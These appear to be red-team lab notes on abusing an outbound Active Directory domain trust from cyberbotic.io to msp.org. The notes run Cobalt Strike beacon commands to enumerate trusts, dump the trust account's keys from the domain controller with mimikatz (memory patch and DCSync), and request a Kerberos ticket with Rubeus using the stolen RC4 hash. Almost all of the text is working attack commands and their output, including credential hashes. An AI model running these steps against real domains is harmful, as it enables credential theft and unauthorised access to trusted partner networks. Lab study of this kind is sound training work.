```
beacon> powershell Get-DomainTrust   /powershell Get-DomainTrust -Domain cyberbotic.io

SourceName      : cyberbotic.io
TargetName      : msp.org
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FILTER_SIDS
TrustDirection  : Outbound
WhenCreated     : 8/16/2022 9:49:17 AM
WhenChanged     : 8/16/2022 9:49:17 AM
```
We can still partially exploit this trust and obtain "domain user" access from CYBER to MSP by leveraging the shared credential for the trust.
Here we see that the DC in CYBER has two TDOs for its trusts with DEV and MSP.
```
beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(objectCategory=trustedDomain)" --domain cyberbotic.io --attributes distinguishedName,name,flatName,trustDirection

[*] TOTAL NUMBER OF SEARCH RESULTS: 2
	[+] distinguishedName : CN=dev.cyberbotic.io,CN=System,DC=cyberbotic,DC=io
	[+] name              : dev.cyberbotic.io
	[+] flatName          : DEV
	[+] trustDirection    : 3

	[+] distinguishedName : CN=msp.org,CN=System,DC=cyberbotic,DC=io
	[+] name              : msp.org
	[+] flatName          : MSP
	[+] trustDirection    : 2
```
Get the keys
Option1:
from dc memory patch (risky)
```
beacon> getuid
[*] You are NT AUTHORITY\SYSTEM (admin)

beacon> mimikatz lsadump::trust /patch

Domain: MSP.ORG (MSP / S-1-5-21-616357355-3455548143-339820157)
 [  In ] CYBERBOTIC.IO -> MSP.ORG

 [ Out ] MSP.ORG -> CYBERBOTIC.IO
    * 8/16/2022 9:49:17 AM - CLEAR   - 93 8e aa 1f 5f 6e 2a cc 51 7d d4 a8 07 f2 f0 2c a3 e0 20 3b 24 32 68 58 0d f8 ad cc
	* aes256_hmac       5db44be4317433d5ab1d3dea5925126d295d3e21c9682bca7fef76bc5a878f30
	* aes128_hmac       9851d2d80411e6d40122005d1c361579
	* rc4_hmac_nt       f3fc2312d9d1f80b78e67d55d41ad496
```

TDO´s GUID
```
beacon> powershell Get-DomainObject -Identity "CN=msp.org,CN=System,DC=cyberbotic,DC=io" | select objectGuid

objectguid                          
----------                          
b93d2e36-48df-46bf-89d5-2fc22c139b43
```
```
beacon> mimikatz @lsadump::dcsync /domain:cyberbotic.io /guid:{b93d2e36-48df-46bf-89d5-2fc22c139b43}

[DC] 'cyberbotic.io' will be the domain
[DC] 'dc-1.cyberbotic.io' will be the DC server
[DC] Object with GUID '{b93d2e36-48df-46bf-89d5-2fc22c139b43}'
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : msp.org

** TRUSTED DOMAIN - Antisocial **

Partner              : msp.org
 [ Out ] MSP.ORG -> CYBERBOTIC.IO
    * 8/16/2022 9:49:17 AM - CLEAR   - 93 8e aa 1f 5f 6e 2a cc 51 7d d4 a8 07 f2 f0 2c a3 e0 20 3b 24 32 68 58 0d f8 ad cc
	* aes256_hmac       5db44be4317433d5ab1d3dea5925126d295d3e21c9682bca7fef76bc5a878f30
	* aes128_hmac       9851d2d80411e6d40122005d1c361579
	* rc4_hmac_nt       f3fc2312d9d1f80b78e67d55d41ad496
```
We want the \[ out \] KEY

Request tgt 
```
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:CYBER$ /domain:msp.org /rc4:f3fc2312d9d1f80b78e67d55d41ad496 /nowrap
```
